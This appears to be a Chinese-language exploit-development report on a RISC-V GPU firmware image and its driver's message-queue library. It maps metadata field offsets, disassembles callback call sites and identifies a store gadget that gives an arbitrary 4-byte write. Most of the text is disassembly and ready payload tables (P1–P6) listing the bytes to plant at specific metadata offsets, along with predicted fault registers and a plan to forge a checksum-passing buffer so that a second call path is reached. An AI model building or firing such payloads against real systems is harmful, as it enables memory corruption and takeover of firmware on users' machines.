# 从"写固定字段"到"写指定地址":元数据函数指针调用点的实参语义与任意写原语

只读、离线、静态。对象 `gsp61057_rx_full.bin`(RV64GC,基址 0x1000000,VA=文件偏移+0x1000000)。
工件在 `parallel/ds_work/`。字段名对照宿主 `driver_gpio_internal_610.43.03/src/nvidia/inc/libraries/msgq/msgq_priv.h`。

**一句话结论:存在。** 已实测可达的 `rxrefresh`(0x1004c6c)调用点把 **a1 设为 `*(meta+0x38)`(字段内容,不是字段地址)**、
**a4 设为 `*(meta+0xc0)`(内容)**;把 `meta+0xb8` 指向镜像里的 `c.sw a4,0(a1); c.li a0,0; c.jr ra` gadget(0x1b52246)
即可得到 **目的地址与写入值双双由我们字段内容决定** 的任意 4 字节写,且调用返回干净。**不需要** MarkConsumed/TX-post 可达。

---

## 1. 结论/证据一览

| 命题 | 证据 | 置信 |
|---|---|---|
| msgqMetadata 布局:`0x30 pReadIncoming / 0x38 pWriteIncoming / 0x40 pReadOutgoing / 0x9c rxReadPtr / 0x8c rx.writePtr / 0xa4 rxLinked / 0xa5 rxSwapped / 0xa8 fcnNotify / 0xb0 fcnNotifyArg / 0xb8 fcnBackendRw / 0xc0 fcnBackendRwArg / 0xc8 fcnInvalidate / 0xd0 fcnFlush / 0xd8 fcnZero / 0xe0 fcnBarrier` | 用 msgq_priv.h 逐字段算偏移,与反汇编读到的每个偏移**逐位吻合**(`ds_struct_map.txt`) | A |
| rxrefresh 调用回调时 **a1=值(*(0x38))、a4=值(*(0xc0)),a0=地址(handle+0x8c)** | 0x1004c8c `c.ld a5,0xb8(a0)`;0x1004c8e `c.ld a1,0x38(a0)`;0x1004c92 `c.ld a4,0xc0(a0)`;0x1004c98 `addi a0,a0,0x8c`;0x1004c9c `c.jalr a5` | A |
| MarkConsumed 回调时 **a0=值(*(0x40))、a4=值(*(0xc0)),a1=地址(handle+0x9c)** | 0x1004d10/0x1004d12/0x1004d1e/0x1004d2c/0x1004d30 | A |
| TX-post 回调时 **a0=值(*(0x30))**,a1=4 | 0x1b597b6 `c.ld a4,0xc8(s8)`;0x1b597c0 `c.ld a0,0x30(s8)`;0x1b597c6 `c.jalr a4` | A |
| gadget 0x1b52246 = `c.sw a4,0(a1); c.li a0,0; c.jr ra`(2字节对齐、入口干净、返回 a0=0) | `ds_gadget_arbwrite.asm` | A |
| rxrefresh 调用点实机可达(ck=0) | 枪A 崩溃现场 `ra=0x1004c9e`(=0x1004c9c 的下一条) | A |
| 任意写端到端 | 本报告 P1 载荷(未实机) | B(推演) |

---

## 2. Q1:每个调用点 a0/a1/a2/a4 是"地址"还是"值"

"值"= `ld rd, off(base)` 把 **[base+off] 里存的 8 字节内容** 放进 rd;"地址"= `addi rd, base, off` 传 **[base+off] 本身**。

### rxrefresh(0x1004c6c,@0x1004c9c,槽 +0xb8)
```
0x1004c8c  c.ld  a5, 0xb8(a0)   ; target = 值
0x1004c8e  c.ld  a1, 0x38(a0)   ; a1 = 值(*(meta+0x38) = pWriteIncoming 内容)  <<< 任意地址来源
0x1004c92  c.ld  a4, 0xc0(a0)   ; a4 = 值(*(meta+0xc0) = fcnBackendRwArg 内容)
0x1004c94  c.li  a3, 0
0x1004c96  c.li  a2, 4
0x1004c98  addi  a0, a0, 0x8c   ; a0 = 地址(meta+0x8c,rx.writePtr 字段地址)  <<< 固定
0x1004c9c  c.jalr a5
```
### MarkConsumed(0x1004cdc,@0x1004d30,槽 +0xb8)
```
0x1004d10  c.ld  a5, 0xb8(s1)   ; target
0x1004d12  c.ld  a0, 0x40(s1)   ; a0 = 值(*(meta+0x40) = pReadOutgoing 内容)  <<< 任意地址来源
0x1004d14  lbu   a3, 0xa5(s1)   ; rxSwapped
0x1004d1e  c.ld  a4, 0xc0(s1)   ; a4 = 值
0x1004d2a  c.li  a2, 4
0x1004d2c  addi  a1, s1, 0x9c   ; a1 = 地址(meta+0x9c,rxReadPtr)
0x1004d30  c.jalr a5
```
### 其余槽(同函数)
- +0xd0 fcnFlush @0x1004d4a:a0=值(*(0x40)),a1=4;+0xe0 fcnBarrier @0x1004d50:a0=上一返回值,a1 不变;
  +0xa8 fcnNotify @0x1004d5a:a0=1,a1=值(*(0xb0))。
- **+0xb8==0 的内建回退**:0x1004d7c `lw a5,0x9c(s1)`,0x1004d80 `c.sw a5,0(a0)` —— 直接 `*(u32)(*(meta+0x40)) = rxReadPtr(值可控)`。即 MarkConsumed 本身在无 backend 时就是一次 4 字节写(地址=字段内容)。
### TX-post(0x1b594d0,@0x1b597c6,槽 +0xc8)
```
0x1b597b6  c.ld  a4, 0xc8(s8)   ; target = 值
0x1b597c0  c.ld  a0, 0x30(s8)   ; a0 = 值(*(meta+0x30) = pReadIncoming 内容)  <<< 任意地址来源
0x1b597c4  c.li  a1, 4
0x1b597c6  c.jalr a4
```
**Q1 结论:rxrefresh 的 a1、MarkConsumed 的 a0、TX-post 的 a0 都是"字段里存的值"(内容),不是字段地址。**
rxrefresh 的 a0 与 MarkConsumed 的 a1 才是字段地址。

---

## 3. Q2:全部"经元数据函数指针"的调用点 + 可达性

全镜像按槽 {0xa8,0xb8,0xc8,0xd0,0xd8,0xe0} 扫描(`ds_meta_callbacks.txt`),msgq 库区(0x1004xxx)与 TX-post 内只有 6 处:

| # | 函数 | 调用点 | 槽 | 触发条件 | a0 | a1 | a2 | a3 | a4 | 可达性 |
|---|---|---|---|---|---|---|---|---|---|---|
|1|rxrefresh|0x1004c9c|+0xb8|ck=0 重试即达|meta+0x8c(**地址**)|`*(0x38)`(**值**)|4|0|`*(0xc0)`(值)|**A 已实测**|
|2|MarkConsumed|0x1004d30|+0xb8|校验通过或 seq-gap|`*(0x40)`(**值**)|meta+0x9c(地址)|4|1\|(rxSwapped<<8)|`*(0xc0)`(值)|见下|
|3|MarkConsumed|0x1004d4a|+0xd0 fcnFlush|同上|`*(0x40)`(值)|4|—|—|—|同上|
|4|MarkConsumed|0x1004d50|+0xe0 fcnBarrier|同上|上返回值|—|—|—|—|同上|
|5|MarkConsumed|0x1004d5a|+0xa8 fcnNotify|同上|1|`*(0xb0)`(值)|—|—|—|同上|
|6|TX-post|0x1b597c6|+0xc8 fcnInvalidate|GSP 发任一消息|`*(0x30)`(**值**)|4|—|—|—|C(时机)|

另外 0x1004d80 是 +0xb8==0 的内建直接写(见 §2)。

### 关键回答:是否存在"目的地址来自字段**内容**"的可达调用点 —— 存在,两条:
1. **rxrefresh 的 a1 = `*(meta+0x38)`:已是"字段内容",且该调用点实机可达(A)。** 直接把 `+0xb8` 指到"以 a1 为基址写"的 gadget,即得任意目的地址写(§5 P1)。
2. MarkConsumed 的 a0 = `*(meta+0x40)` 也是内容(更直接、无需 a1 作基址的 gadget),但可达性有争议(见下)。

### 关于"MarkConsumed 不可达"这个前提 —— 需要更正/存疑(B)
`ds_recv_flow.txt` 显示:**对同一个超长报文,两处 MarkConsumed 静态可达,且"msgLen 检查失败"分支也会落入 MarkConsumed 调用**:
```
0x10162b0  bltu a1,a4 -> 0x1016354     ; 声明长度过大 -> 走这里
0x1016354  log; s1=0x3a
0x101636a  c.j -> 0x10162bc            ; === 直接落到 MarkConsumed 调用点 ===
0x10162bc  a1=s2(=1); a0=hQueue
0x10162c0  call 0x1004cdc              ; MarkConsumed 正常消费点
...
0x10163fc  call 0x1004cdc              ; seq-gap 重同步点(seq<期望且 gap<上一 gap)
```
校验(checksum/magic/seq)读的全是 **staging 内容,而 staging 正是被我们越界拷贝覆盖的我们自己的字节**,因此理论上可以构造成"校验通过 + 声明长度过大",从而进入 0x1016354→0x10162c0 调用 MarkConsumed。
唯一会拦截的是 `meta+0xa0(rxAvail)` 覆盖值:枪A 里我们把 rxAvail 置 0,于是下一次循环 `bgeu s4,rxAvail` 成立、先走 0x1016200 调 rxrefresh(即崩溃点)。
**因此"MarkConsumed 不可达"更像是"枪A载荷下不可达",而非结构不可达** —— 用 P4 一枪判定(§5)。

---

## 4. Q3:helper 0x100cf9c 的准确签名与语义;把 fcnBackendRw 指回它可行吗

逐指令(`ev_copyhelper_full_0x100cf9c.asm`)推出:

```
NvU32 helper(void *a0, void *a1, NvU32 a2 /*len*/, NvU32 a3 /*flags*/, QueueWindow *a4)
  s1=a4; s3=a0; s4=a1; s2=a2; a5=*(u64)(a4+0x78)          ; 窗口基址
  dir = a3 & 1; alt = a3 & 0x100
  dir==0: off = (u64)a1 - windowBase;   bound = alt ? *(u64)(a4+0x18) : *(u64)(a4+0x8)
  dir==1: off = (u64)a0 - windowBase;   bound = alt ? *(u64)(a4+0x18) : *(u64)(a4+0x8)
  if (off >= bound) return 0x1e/0x40                        ; 仅"窗口侧"受检
  pte_base = *(u64)(a4+0x80); if 0 -> return 0x8c/0x40
  phys = *(u64)(pte_base + ((off>>12)<<3)) + (off & 0xfff)  ; 页表翻译窗口侧地址
  dir==0: copy(dev_addr=a0  <- phys, len=s2)                ; 宿主窗口 -> 设备
  dir==1: copy(phys <- dev_addr=a1, len=s2)                 ; 设备 -> 宿主窗口
  return 0
```
- **设备侧地址(a0@dir0 或 a1@dir1)不做任何长度/范围检查;只有窗口侧地址受 bound 检查并经 `a4+0x80` 页表翻译。**
- 结构字段:`a4+0x78` 窗口基址、`a4+0x8` 窗口尺寸、`a4+0x18` 备用尺寸、`a4+0x80` 页表基址、`a4+0x88` 存在位。返回值:0 成功,0x40/0x1e/0x8c 各类错误。

### 指回 0x100cf9c 是否可行:分别看两个可达调用点
- **经 rxrefresh(可达)**:传参 = a0=meta+0x8c(固定设备地址)、a1=`*(meta+0x38)`(可控,当窗口偏移)、a2=4、**a3=0(dir=0)**、a4=`*(meta+0xc0)`(可控,可指我们伪造的 queueinfo)。
  ⇒ 结果是 "宿主窗口内 4 字节 → **meta+0x8c**",**设备目的地址被钉死在 meta+0x8c,不任意**;且需要 `a4+0x80` 是**合法页表**(我们无法凭字段凭空造 PT)。`pOurEntries/pTheirEntries` 等字段**不参与** helper(偏移由调用者给)。
- **经 MarkConsumed(可达性存疑)**:a3 恒为 `1|(rxSwapped<<8)` ⇒ **dir=1**,a0=`*(meta+0x40)` 被当作**窗口侧**地址、a1=meta+0x9c 是**设备源** ⇒ 这是"设备→宿主"**回读**,不产生任意设备写。

**所以:把 fcnBackendRw 指回 helper,不能替代 §5 P1 的 gadget 完成"任意设备地址写"。** 它的真实价值是:
(i) 经 rxrefresh 得到一条"宿主→设备定点注值(meta+0x8c)"的窄信道(可让宿主二次影响 rxAvail);
(ii) 经 MarkConsumed(dir=1)得到"设备→宿主 4 字节回读"信道(需其可达)。
两者都依赖真实窗口/页表(即 t2 与 0x4191620+0x80 的假设,C 级)。**结论:优先级低于直接 gadget。**

---

## 5. Q4:下一枪载荷规格(按优先级;元素32=msgqMetadata,偏移即 meta 偏移)

通用:K=33;元素 0 头同前;元素 1..31 全零;元素 32 除表列外全零;ck=0(不修 checksum ⇒ 走重试路径,与枪A 同路线)。详见 `ds_payload_specs.md`。

### P1【最优先】任意目的地址写证明(ck=0)
| meta 偏移 | 值(小端) | 含义 |
|---|---|---|
|0xa4|`01`|rxLinked=1(rxrefresh 前置)|
|0xb8|`46 22 b5 01 00 00 00 00`|gadget 0x1b52246 = `c.sw a4,0(a1); c.li a0,0; c.jr ra`|
|0x38|`00 00 ad de 00 00 00 00`|**a1 = DST = 0xdead0000(由字段内容决定)**|
|0xc0|`44 33 22 11 00 00 00 00`|a4 = VAL = 0x11223344|

**预测:`sepc=0x1b52246`,`scause=0xf`(store page fault),`stval=0xdead0000`,`a1=0xdead0000`,`a4=0x11223344`,`a5=0x1b52246`;PC trace 含 0x1004c9c→0x1b52246。**
证明:目的地址完全由我们字段内容给出 ⇒ "写到指定地址"达成。(若 DST 意外可映射,则表现为不崩+超时 ⇒ 换 P3。)

### P2 1 字节精确写(ck=0,可选)
同上,`0xb8=0x1b6b1f6`(`sb a4,0(a1); c.li a0,0; c.jr ra`),`0x38=DST`,`0xc0=VAL`(取低 8 位)。

### P3 已映射目标落地检验(ck=0)
同 P1,改 `0x38=0x418ff68`(栈金丝雀全局,由 lookup/crashfn/TX-post 三处独立计算确认),`0xc0=41 00 00 00`。
**预测:gadget 处不 fault;若之后有带金丝雀校验的函数(TX-post/lookup)运行,则在栈溢出钩(~0x1b5b68 / fail 钩 ~0x1b4da14)出现与前所有枪不同的新崩溃 PC = "写入已落地"。** 若全程无新崩溃只有 Timeout,则视为"落地但未观测"。

### P4【重点】MarkConsumed 可达性判定(ck=1,seq=期望值)
目的:判定 §3 的存疑。设 `0xa0(rxAvail)=非0` 使流程不走 0x1016200 的 rxrefresh 分支;`0xb8=0x17460e8`(`c.sw a4,0(a0)`);`0x40=DST`;`0xc0=VAL`;并把 staging(buffer[0..0x20000])构造成 checksum 折叠=0、magic 通过、seq=期望值、`*(buffer+0x18)` 小值。
**预测:若 MarkConsumed 被调用 ⇒ a0=`*(meta+0x40)`=DST ⇒ 在 0x17460e8 处 fault(`sepc=0x17460e8,stval=DST`);若只在 rxrefresh 被调用 ⇒ 仅写 meta+0x8c,不崩/超时。** 出现 DST fault 即证明 MarkConsumed 可达且 a0=字段内容(比 P1 更直接,并解锁 +0xd0/+0xe0/+0xa8 与 0x1004d80 内建写)。

### P5 helper 通道(ck=0,验 t2)
`0xb8=0x100cf9c`,`0xc0=0x4191620`(真 queueinfo),`0x38=窗口内偏移(≥q[0x78] 且 < q[0x78]+min(q[8],q[0x18]))`,`0xa4=01`。
**预测:偏移合法 ⇒ 无崩溃且 meta+0x8c 变为宿主缓冲对应 4 字节(之后 rxAvail 重算被宿主影响);偏移非法 ⇒ helper 安全返回错误、无副作用。此枪兼作 t2=0x15129b000 与页表 q[0x80] 假设的二分检验(C 级)。**

### P6 静默持久化对照(ck=0,最便宜)
`0x88=64`,`0x8c/0x9c/0xa0=0`,`0xa4=01`,`0xb8=0x100dcba`(`li a0,0; ret`)。**预测:无 GSP 崩溃、宿主 Timeout;meta 保持腐化。**

---

## 6. 置信度与不确定项

- **A**:§1/§2 全部调用点实参语义(逐指令);struct 偏移映射(与反汇编逐位吻合);P1 gadget 指令边界与语义;rxrefresh 实机可达(枪A ra 互证);helper 0x100cf9c 的边界/页表/方向分支(逐指令)。
- **B**:"rxrefresh a1=内容 ⇒ 任意写"的端到端推演(未实机);MarkConsumed 两处静态可达、且 msgLen 失败分支落入 MarkConsumed 调用(**与既有前提冲突,建议 P4 判定**)。
- **C/不确定**:TX-post +0xc8 的**触发时机**;t2=0x15129b000 是 sysmem 队列 DVA;`a4+0x80` 页表与真实窗口在运行期的具体内容;堆地址跨启动确定性(仅单次 K33 样本,枪E1 类检验);helper 调用的底层拷贝例程 0x1a9e19e 身份(反汇编呈断言宏样式,未逐条确认)。
- 未做:任何 GPU/驱动/虚拟机操作;未实机打枪。

## 附:新增/使用工件(均在 `parallel/ds_work/`)
- `ds_meta_callbacks.txt` — 全 msgq 区/TX-post 的元数据函数指针调用点扫描结果(6 处)。
- `ds_gadget_arbwrite.asm` — 任意写 gadget 反汇编上下文。
- `ds_struct_map.txt` — msgqMetadata 偏移推导(与观察值对照)。
- `ds_recv_flow.txt` — recv 0x1016104 关键控制流与两处 MarkConsumed 可达路径。
- `ds_payload_specs.md` — P1..P6 载荷规格。
- 脚本:`ds_scan_meta_callbacks_range.py`、`ds_scan_write_gadgets.py`。

---

## 总结
- rxrefresh(0x1004c6c)调用回调时:**a1=`*(meta+0x38)`、a4=`*(meta+0xc0)` 是"值"(字段内容),a0=meta+0x8c 才是"地址"**;MarkConsumed 的 a0=`*(meta+0x40)` 也是"值";TX-post 的 a0=`*(meta+0x30)` 也是"值"(逐指令 A 级)。
- 因此 **"目的地址来自元数据字段内容"的调用点存在**:rxrefresh 的 a1。把 `+0xb8` 指向 `c.sw a4,0(a1); li a0,0; ret`(0x1b52246),`+0x38`=DST、`+0xc0`=VAL,即得**任意 4 字节写**,且此调用点已被枪A 实测可达(ck=0),无需 MarkConsumed/TX-post。
- 下一枪最高优先级 = P1(DST=0xdead0000,预测 `scause=0xf,sepc=0x1b52246,stval=DST`,一击证明任意目的地址)。
- 附带更正/存疑:**"MarkConsumed 不可达"可能只对枪A载荷成立** —— 反汇编显示 msgLen 失败分支 0x1016354→0x10162bc **直接调用 MarkConsumed**,而校验读的是我们覆盖过的 staging;若 P4 打中 `stval=DST` 即证明其可达,并解锁 a0 直控与 +0xd0/+0xe0/+0xa8 槽。
- helper 0x100cf9c **不能**替代 gadget 做任意设备写:它只对"窗口侧"地址做边界与页表翻译,设备侧地址由调用者给;经 rxrefresh 时 a0 被钉死在 meta+0x8c,经 MarkConsumed 时恒为"设备→宿主"回读。它只值一条窄的宿主↔设备 4 字节信道(P5,兼验 t2)。
- 剩余不确定:TX-post 触发时机、t2/页表运行期内容、堆地址确定性(单样本)、底层拷贝例程身份。
